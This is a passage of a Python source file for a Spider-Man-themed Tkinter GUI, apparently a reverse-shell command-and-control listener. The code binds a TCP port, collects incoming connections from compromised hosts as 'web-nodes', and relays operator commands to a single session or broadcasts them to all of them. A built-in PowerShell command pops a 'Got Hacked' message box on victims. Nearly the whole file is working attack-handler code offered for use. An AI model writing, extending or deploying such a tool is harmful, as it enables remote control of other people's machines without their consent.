    def log_to_session(self, session_id, text, tag=None):
        session = self.sessions.get(session_id)
        if not session:
            return
        session.append(text, tag)
        if session_id == self.active_id:
            self.write_output(text, tag)

    def refresh_session_list(self):
        self.session_list.delete(0, tk.END)
        for session in self.sessions.values():
            suffix = "  💀 [DISCONNECTED]" if not session.alive else "  🕸"
            self.session_list.insert(tk.END, session.label + suffix)
        self.count_label.config(text=f"web-nodes: {len(self.sessions)}")

    def add_session(self, session):
        self.sessions[session.id] = session
        self.refresh_session_list()
        if self.active_id is None:
            self.select_session(session.id)

    def select_session(self, session_id):
        self.active_id = session_id
        session = self.sessions.get(session_id)
        self.output.config(state=tk.NORMAL)
        self.output.delete("1.0", tk.END)
        if session:
            status = "🕸 CONNECTED" if session.alive else "💀 DISCONNECTED"
            self.terminal_title.config(text=f" 🕷  {session.label}  •  {status}")
            for text, tag in session.log_lines:
                self.output.insert(tk.END, text, tag or "")
            self.output.see(tk.END)
        else:
            self.terminal_title.config(text=" 🕷  NO WEB-NODE SELECTED  •  CLICK A NODE TO BEGIN")
        self.output.config(state=tk.DISABLED)

    def select_from_list(self, _event=None):
        selected = self.session_list.curselection()
        if selected:
            session_id = list(self.sessions.keys())[selected[0]]
            self.select_session(session_id)

    def rename_selected(self):
        if self.active_id is None:
            messagebox.showwarning("🕷 No Web-Node", "Select a web-node first, hero!")
            return
        session = self.sessions.get(self.active_id)
        if not session:
            return
        name = simpledialog.askstring(
            "✎ RENAME WEB-NODE", f"Enter alias for {session.peer}:",
            initialvalue=session.display_name or ""
        )
        if name is None:
            return
        name = name.strip()
        if not name:
            messagebox.showwarning("Invalid Alias", "Even heroes need a name!")
            return
        session.rename(name)
        self.refresh_session_list()
        self.terminal_title.config(text=f" 🕷  {session.label}  •  🕸 CONNECTED")

    def insert_lab_message(self):
        command = (
            'powershell -NoProfile -Command '
            '"Add-Type -AssemblyName System.Windows.Forms; '
            '[System.Windows.Forms.MessageBox]::Show('
            '\'Got Hacked\', \'By c0mrade\')"'
        )
        self.input_entry.delete(0, tk.END)
        self.input_entry.insert(0, command)
        self.input_entry.focus_set()
        if hasattr(self, 'logo_canvas') and self.logo_canvas:
            self.logo_canvas.shoot_web(self.logo_canvas.width // 2, self.logo_canvas.height // 2)

    def send_data(self, _event=None):
        text = self.input_entry.get()
        if not text:
            return

        self.add_to_history(text)

        if self.broadcast_mode:
            alive_sessions = [s for s in self.sessions.values() if s.alive]
            if not alive_sessions:
                messagebox.showwarning("🕷 No Web-Nodes", "No active web-nodes to broadcast to!")
                return
            success_count = 0
            for session in alive_sessions:
                try:
                    session.send(text)
                    self.log_to_session(session.id, f"📡 >> {text}\n", "sent")
                    success_count += 1
                except OSError as error:
                    self.log_to_session(session.id, f"💀 [err] Broadcast failed: {error}\n", "err")
            self.write_output(f"[sys] 📡 Broadcast sent to {success_count}/{len(alive_sessions)} web-nodes\n", "web")
            self.input_entry.delete(0, tk.END)
            if hasattr(self, 'logo_canvas') and self.logo_canvas:
                for _ in range(3):
                    self.logo_canvas.shoot_web(
                        random.randint(20, self.logo_canvas.width - 20),
                        random.randint(20, self.logo_canvas.height - 20)
                    )
        else:
            if self.active_id is None:
                messagebox.showwarning("🕷 No Web-Node", "Select a web-node first! Spidey-sense tingling...")
                return
            session = self.sessions.get(self.active_id)
            if not session or not session.alive:
                messagebox.showwarning("💀 Node Dead", "That web-node has been severed.")
                return
            try:
                session.send(text)
                self.log_to_session(session.id, f"🕸 >> {text}\n", "sent")
                self.input_entry.delete(0, tk.END)
                if hasattr(self, 'logo_canvas') and self.logo_canvas:
                    self.logo_canvas.shoot_web(
                        random.randint(20, self.logo_canvas.width - 20),
                        random.randint(20, self.logo_canvas.height - 20)
                    )
            except OSError as error:
                self.log_to_session(session.id, f"💀 [err] Web snapped: {error}\n", "err")

    def close_selected(self):
        if self.active_id is None:
            return
        session = self.sessions.get(self.active_id)
        if session:
            session.close()
            self.log_to_session(session.id, "💀 [sys] Web-node severed by operator.\n", "sys")
            self.refresh_session_list()

    def start_listener(self, _event=None):
        if self.listening:
            return
        host = self.host_entry.get().strip() or "0.0.0.0"
        try:
            port = int(self.port_entry.get().strip() or "1194")
        except ValueError:
            messagebox.showerror("💀 Invalid Port", "Port must be a number, hero!")
            return
        if not 1 <= port <= 65535:
            messagebox.showerror("💀 Invalid Port", "Port must be between 1 and 65535.")
            return
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(20)
        except OSError as error:
            messagebox.showerror("💀 Web Error", str(error))
            return

        self.server_socket = server
        self.listening = True
        self.write_output(f"[sys] 🕸 Web deployed on {host}:{port}\n", "sys")
        self.listener_thread = threading.Thread(target=self.accept_loop, daemon=True)
        self.listener_thread.start()

    def auto_start_listener(self):
        self.mode.set("listen")
        self.start_listener()

    def accept_loop(self):
        while self.listening:
            try:
                client, address = self.server_socket.accept()
            except OSError:
                break
            peer = f"{address[0]}:{address[1]}"
            session = Session(client, peer)
            self.root.after(0, self.add_session, session)
            self.root.after(0, self.log_to_session, session.id,
                            f"[sys] 🕷 New web-node caught: {peer}\n", "sys")
            threading.Thread(target=self.receive_loop, args=(session,), daemon=True).start()

    def receive_loop(self, session):
        while session.alive:
            try:
                data = session.sock.recv(4096)
            except OSError:
                break
            if not data:
                break
            text = data.decode("utf-8", errors="replace")
            self.root.after(0, self.log_to_session, session.id, text, "recv")

        session.alive = False
        self.root.after(0, self.log_to_session, session.id,
                        "[sys] 💀 Web-node disconnected.\n", "sys")
        self.root.after(0, self.refresh_session_list)

    def stop_all(self):
        self.listening = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except OSError:
                pass
        self.server_socket = None
        for session in self.sessions.values():
            session.close()
        self.write_output("[sys] 💀 All webs retracted. Going dark.\n", "sys")
        self.refresh_session_list()

    def on_close(self):
        self.stop_all()
        if hasattr(self, 'logo_canvas') and self.logo_canvas:
            self.logo_canvas.stop()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    WebSlingerUltimate(root)
    root.mainloop()
